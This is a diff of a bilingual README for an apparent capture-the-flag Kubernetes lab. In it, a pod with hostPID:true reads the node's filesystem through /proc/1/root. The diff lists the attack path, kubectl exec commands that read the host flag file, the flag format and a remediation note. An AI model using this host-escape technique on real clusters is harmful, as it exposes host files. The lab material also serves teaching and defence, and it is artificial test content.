@@ -10,24 +10,11 @@
 | 难度 | L1 |
 | 交付方式 | KIND / Kubernetes |
 | 入口 | KIND 集群内入口（无固定宿主端口） |
+| 集群 | cve-k8s-23-seccomp-bypass |
+| 镜像 | kindest/node:v1.27.3 |
+| 攻击面 | hostPID:true → /proc/1/root → host filesystem access |
 
 ## 场景概述
-- 技术：N/A (misconfiguration)
-- 难度：L1
-- 交付方式：k8s
-## 攻击路径与利用步骤
-
-## Overview
-| Property | Value |
-|----------|-------|
-| CVE | N/A (hostPID misconfiguration) |
-| Difficulty | L1 |
-| Type | k8s |
-| Cluster Name | cve-k8s-23-seccomp-bypass |
-| KIND Image | kindest/node:v1.27.3 |
-| Attack Vector | hostPID:true → /proc/1/root → host filesystem access |
-
-## Attack Path
 
 ```
 Pod with hostPID:true (appears locked down: non-root, no caps)
@@ -35,7 +22,12 @@ Pod with hostPID:true (appears locked down: non-root, no caps)
   → Read flag from /host-flag/flag.txt on node
 ```
 
-## Step-by-Step Exploitation
+## 前置知识
+
+- kubectl access to KIND cluster `cve-k8s-23-seccomp-bypass`
+- 目标 pod 启用 `hostPID: true`（非特权、已弃权 capabilities），可读 `/proc/1/root`
+
+## 利用步骤
 
 ### Step 1: Examine Pod Security Context
 
@@ -62,20 +54,18 @@ kubectl exec -n monitor-ns monitor-pod -- ps aux
 kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/cmdline
 ```
 
-## Flag Location
-- **Primary**: `/host-flag/flag.txt` on the KIND node
-- **Format**: `flag{k8s-23-<16-hex>}`
+## 验证命令
 
-## Key Takeaway
-hostPID:true is a severe security risk even without privileged mode or capabilities.
-`/proc/1/root/` provides access to the full host filesystem.
-
-## Verification
 ```bash
 cd cve_challenges/scenarios/k8s/seccomp-bypass && bash deploy.sh
 kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/root/host-flag/flag.txt
 bash teardown.sh
 ```
+
+## Flag
+
+- **Primary**: `/host-flag/flag.txt` on the KIND node
+- **Format**: `flag{k8s-23-<16-hex>}`
 
 ## 此场景利用了哪些知识
 
@@ -88,4 +78,8 @@ bash teardown.sh
 | 验证 | Read the flag through the host procfs view |
 
 ## 修复建议
+
 升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
+
+hostPID:true is a severe security risk even without privileged mode or capabilities.
+`/proc/1/root/` provides access to the full host filesystem.
